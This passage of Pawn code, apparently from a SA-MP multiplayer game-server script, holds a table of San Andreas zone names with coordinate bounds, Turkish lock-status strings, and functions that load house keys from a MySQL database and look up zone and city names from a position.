		{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
		{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
		{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
		{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
		{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
		{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
		{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
		{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
		{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
		{"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
		{"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
		{"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
		{"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
		{"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
		{"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
		{"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
		{"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
		{"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
		{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
		{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
		{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
		{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
		{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
		{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
		{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
		{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
		{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
		{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
		{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
		{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
		{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
		{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
		{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
		{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
		{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
		{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
		{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
		{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
		{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
		{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
		{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
		{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
		{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
		{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
		{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
		{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
		{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
		{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
		{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
		{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
		{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
		{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
		{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
		{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
		{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
		{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
		{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
		{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
		{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
		{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
		{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
		{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
		{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
		{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
		{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
		{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
		{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
		{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
		{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
		{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
		{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
		{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
		{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
		{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
		{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
		{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
		{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
		{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
		{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
		{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
		{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
		{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
		{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
		{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
		{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
		{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
		{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
		{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
		{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
		{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
		{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
		{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
		{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
		{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
		{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
		{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
		{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
		{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
		{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
		{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
		{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
		{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
		{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
		{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
		{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
		{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
		{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
		{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
		{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
		{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
		{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
		{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
		{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
		{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
		{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
		{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
		{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
		{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
		{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
		{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
		{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
		{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
		{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
		{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
		{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
		{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
		{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
		{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
		{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
		{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
		{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
		{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
		{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
		{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
		{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
		{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
		{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
		{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
		{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
		{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
		{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
		{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
		{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
		{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
		{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
		{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
		{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
		{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
		{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
		{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
		{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
		{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
		{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
		{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
		{"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
		{"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
		{"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
		{"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
		{"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
		{"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
		{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
		{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
		{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
		{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
		{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
		{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
		{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
		{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
		{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
		{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
		{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
		{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
		{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
		{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
		{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
		{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
		{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
		{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
		{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
		{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
		{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
		{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
		{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
		{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
		{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
		{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
		{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
		{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
		{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
		{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
		{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
		{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
		{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
		{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
		{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
		{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
		{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
		{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
		{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
		{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
		{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
		{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
		{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
		{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
		{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
		{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
		{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
		{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
		{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
		{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
		{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
		{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
		{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
		{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
		{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
		{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
		{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
		{"Randolph Industrial Estate",  {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
		{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
		{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
		{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
		{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
		{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
		{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
		{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
		{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
		{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
		{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
		{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
		{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
		{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
		{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
		{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
		{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
		{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
		{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
		{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
		{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
		{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
		{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
		{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
		{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
		{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
		{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
		{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
		{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
		{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
		{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
		{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
		{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
		{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
		{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
		{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
		{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
		{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
		{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
		{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
		{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
		{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
		{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
		{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
		{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
		{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
		{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
		{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
		{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
		{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
		{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
		{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
		{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
		{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
		{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
		{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
		{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
		{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
		{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
		{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
		{"The Four Dragons Casino",     {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
		{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
		{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
		{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
		{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
		{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
		{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
		{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
		{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
		{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
		{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
		{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
		{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
		{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
		{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
		{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
		{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
		{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
		{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
		{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
		{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
		{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
		{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
		{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
		{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
		{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
		{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
		{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
		{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
		{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
		{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
		{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
		{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
		{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
		{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
		{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
		{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
		{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
		{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
		{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
		{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
		{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
		{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
		{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
		{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
		{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
	};

new
	LockNames[4][32] = {"{2ECC71}Kilitli Deðil", "{E74C3C}Þifre Kilitli", "{E74C3C}Anahtar Gerekli", "{E74C3C}Sadece Sahibi"},
	TransactionNames[2][16] = {"{E74C3C}Alýnan", "{2ECC71}Eklendi"};

stock LoadHouseKeys(playerid)
{
    Iter_Clear(HouseKeys[playerid]);

    new query[72];
    mysql_format(Connection, query, sizeof(query), "SELECT * FROM housekeys WHERE Player='%e'", GetName(playerid));
	mysql_tquery(Connection, query, "GiveHouseKeys", "i", playerid);
	return 1;
}

stock GetZoneName(Float: x, Float: y, Float: z)
{
	new zone[28];
 	for(new i = 0; i < sizeof(SAZones); i++)
 	{
		if(x >= SAZones[i][SAZONE_AREA][0] && x <= SAZones[i][SAZONE_AREA][3] && y >= SAZones[i][SAZONE_AREA][1] && y <= SAZones[i][SAZONE_AREA][4] && z >= SAZones[i][SAZONE_AREA][2] && z <= SAZones[i][SAZONE_AREA][5])
		{
		    strcat(zone, SAZones[i][SAZONE_NAME]);
		    return zone;
		}
	}

	strcat(zone, "Unknown");
	return zone;
}

stock GetCityName(Float: x, Float: y, Float: z)
{
	new city[28];
	for(new i = 356; i < sizeof(SAZones); i++)
	{
		if(x >= SAZones[i][SAZONE_AREA][0] && x <= SAZones[i][SAZONE_AREA][3] && y >= SAZones[i][SAZONE_AREA][1] && y <= SAZones[i][SAZONE_AREA][4] && z >= SAZones[i][SAZONE_AREA][2] && z <= SAZones[i][SAZONE_AREA][5])
		{
